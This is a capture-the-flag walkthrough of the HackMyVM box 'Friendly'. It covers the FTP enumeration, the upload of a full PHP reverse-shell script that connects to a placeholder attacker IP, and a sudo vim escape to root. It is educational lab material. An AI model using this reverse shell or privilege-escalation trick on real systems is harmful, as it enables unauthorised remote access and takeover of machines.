# Friendly from HackMyVM - Detailed writeup
# Box info
**Name**: [Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)  
**Difficulty**: Easy   
**Machine creator(s)**: [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1)  
**Writeup author:** [zedd9001](https://hackmyvm.eu/profile/?user=zedd9001)  
# Intro 
`Friendly` is an easy linux box made for beginners which starts with exploiting FTP to uploading a reverse shell on FTP which also has the webserver in it. Then we get root by exploiting `vim` and rooting this boot2root machine

# Recon 
We can find the IPv4 address using `arp-scan`: 
```
zack@blackarch~$ sudo arp-scan -l 
[sudo] password for zack: 
<  SNIP  >
192.168.100.45    08:00:27:a2:9f:c0    PCS Systemtechnik GmbH
<  SNIP  >
```
Machine IP: `192.168.100.45`  
I will then add it to my `/etc/hosts` (a file that’s used to resolve IP addresses to domain names)    
We can use a single command to do this OR edit it via a text editor/or something else  
The one liner I used:  
```
echo '192.168.100.45 friendly.hmv' | sudo tee -a /etc/hosts
```

## Network Scan 
We will start this box off with a `rustscan` scan  

## `Rustscan` Scan explanation
```
rustscan -a 192.168.100.45 -- -sC -sV -oN nmap/full-tcp.nmap
```
`-a 192.168.100.45` -> Scan the address (`-a`) of `10.10.11.74`   
`--`  -> Pass the found ports to `NMAP` and run the following `NMAP` flags  
`-sC` -> Enumerate with `NMAP`'s default scripts (`--script=default`) for basic enumeration (e.g., service info, SSL certs, and more)  
`-sV` -> Detect and enumerate version  
`-oN nmap/full-tcp.nmap` -> Output the file in a normal readable format and store it at the `nmap` directory and call it `full-tcp.nmap`  

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```
### Scan analysis
Okay, so we have FTP at 21 with anonymous access enabled with a file listing of `index.html`. Sweet, and we have a default apache2 web server. The version doesn't seem to be vulnerable
# FTP Enumeration
`ftp anonymous@friendly.hmv`

```
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,100,45,149,3).
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
ftp> get index.html
226 Transfer complete
ftp> get index.html
227 Entering Passive Mode (192,168,100,45,170,5).
150 Opening BINARY mode data connection for index.html (10725 bytes)
```
Inspecting the contents of `index.html` didn't seem to be too interesting BUT matching it with the webserver proved that they both were the same, so I had an idea, what if we were in the web server's root directory? We could put a malicious webshell/reverse shell if we had write permissions  
Let's put that to the test ;)
```
ftp> put test
227 Entering Passive Mode (192,168,100,45,172,225).
150 Opening BINARY mode data connection for test
226 Transfer complete
5 bytes sent in 0.0001 seconds (67.0596 kbytes/s)
ftp> ls
227 Entering Passive Mode (192,168,100,45,181,183).
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup         5 Nov  8 20:18 test
```
Going to `/test`  
![test](/assets/img/hmv/friendly/test.png)  
OKAY NICEE!!  
Now, we can put a malicious reverse shell and get a shell on the box!  
`revshell.php`
```
<?php
// Change these values to your attacker machine
$ip = '192.168.xx.xx';    // Attacker IP
$port = 4444;         // Attacker port

// Create socket
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit("Connection failed: $errno - $errstr");
}

// Open process and redirect STDIN/STDOUT/STDERR to socket
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (is_resource($process)) {
    // Set streams to non-blocking
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    // Main loop - relay data between socket and process
    while (!feof($sock)) {
        // Check socket for incoming data
        $input = fread($sock, 1024);
        if ($input != "") {
            fwrite($pipes[0], $input);
        }
        
        // Check process stdout for data
        $output = fread($pipes[1], 1024);
        if ($output != "") {
            fwrite($sock, $output);
        }
        
        // Check process stderr for data
        $error = fread($pipes[2], 1024);
        if ($error != "") {
            fwrite($sock, $error);
        }
        
        usleep(100000); // Small delay to prevent CPU overload
    }
    
    // Cleanup
    fclose($sock);
    proc_close($process);
}
?>
```
Now putting this in the FTP server, we can access it at `/revshell.php` and execute it! Just remember to set your desired IP address and port
# Privilege Escalation
Nicee!! We got a shell  
![test](/assets/img/hmv/friendly/shell.png)  

Immediately doing `sudo -l` we can see that we can run `vim` with root permissions 
```
www-data@friendly:/home/RiJaba1$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```
Now, i'm PRETTY sure that `vim` is in GTFOBins so let's check that out  
there indeed is!   
![test](/assets/img/hmv/friendly/vim.png)  
Abusing vim:  
![test](/assets/img/hmv/friendly/rce.png)  
```
www-data@friendly:/var/www$ sudo vim -c ':!/bin/bash'
root@friendly:/var/www# 
```
Then, I read `user.txt` and was about to read `root.txt` but
```
root@friendly:~# cat root.txt 
Not yet! Find root.txt.
```
Huh? this is unusual but i'm not complaining because this box has been fun so far, we can use the find command to find another `root.txt` and read it

```
root@friendly:~# find / -name root.txt 2>/dev/null
/var/log/apache2/root.txt
/root/root.txt
root@friendly:~# cat /var/log/apache2/root.txt
< REDACTED >
```

# Thoughts 
This was a fun box, it was very beginner friendly but I learned some things from it
